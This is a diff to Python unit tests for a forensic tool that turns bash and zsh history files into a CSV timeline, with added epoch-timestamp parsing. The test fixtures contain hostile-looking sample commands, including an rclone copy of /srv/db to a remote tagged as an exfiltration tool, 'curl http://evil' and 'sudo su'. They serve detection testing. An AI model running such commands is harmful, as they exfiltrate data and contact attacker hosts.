@@ -59,11 +59,11 @@ def test_handler_bash_history(tmp_path):
 
     assert r.status == "ok"
     out = (tmp_path / "CSVs" / "bash.csv").read_text(encoding="utf-8")
-    assert "1,alice,bash,,ls" in out
-    assert "2,alice,bash,,whoami" in out
-    assert "1,bob,bash,,id" in out         # sequential id resets per user
-    assert "2,bob,bash,,sudo su" in out
-    assert "3,bob,bash,exfil_tool,rclone copy /srv/db remote:x" in out
+    assert "1,alice,bash,,,ls" in out
+    assert "2,alice,bash,,,whoami" in out
+    assert "1,bob,bash,,,id" in out         # sequential id resets per user
+    assert "2,bob,bash,,,sudo su" in out
+    assert "3,bob,bash,,exfil_tool,rclone copy /srv/db remote:x" in out
 
 
 def test_runner_idempotent_unless_forced(tmp_path):
@@ -1312,14 +1312,21 @@ def test_handler_bash_multi_shell_and_histtimeformat(tmp_path):
     from artifact_engine.handlers import lin_bash
     home = tmp_path / "[root]" / "home" / "bob"
     home.mkdir(parents=True)
-    (home / ".bash_history").write_text("#1700000000\nwhoami\n", encoding="utf-8")  # epoch marker
-    (home / ".zsh_history").write_text(": 1700000000:0;curl http://evil\n", encoding="utf-8")
+    # v0.7.146: the epoch marker times the ONE command after it; a `#` line that
+    # is not an epoch is a comment, and a command with no marker has no time
+    (home / ".bash_history").write_text(
+        "#1700000000\nwhoami\nid\n# not a time\n#1700000060\nuname -a\n", encoding="utf-8")
+    (home / ".zsh_history").write_text(
+        ": 1700000120:0;curl http://evil\nls\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_bash.run(_ctx(tmp_path, out))
     text = (out / "bash.csv").read_text(encoding="utf-8")
-    assert "bob,bash,,whoami" in text
-    assert "bob,zsh,,curl http://evil" in text         # zsh extended-history prefix stripped
-    assert "#1700000000" not in text                    # HISTTIMEFORMAT marker dropped
+    assert "bob,bash,2023-11-14 22:13:20,,whoami" in text
+    assert "bob,bash,,,id" in text
+    assert "bob,bash,2023-11-14 22:14:20,,uname -a" in text
+    assert "bob,zsh,2023-11-14 22:15:20,,curl http://evil" in text   # zsh prefix stripped
+    assert "bob,zsh,,,ls" in text
+    assert "#1700000000" not in text and "not a time" not in text
 
 
 def test_handler_gtfobins_history_abuse(tmp_path):
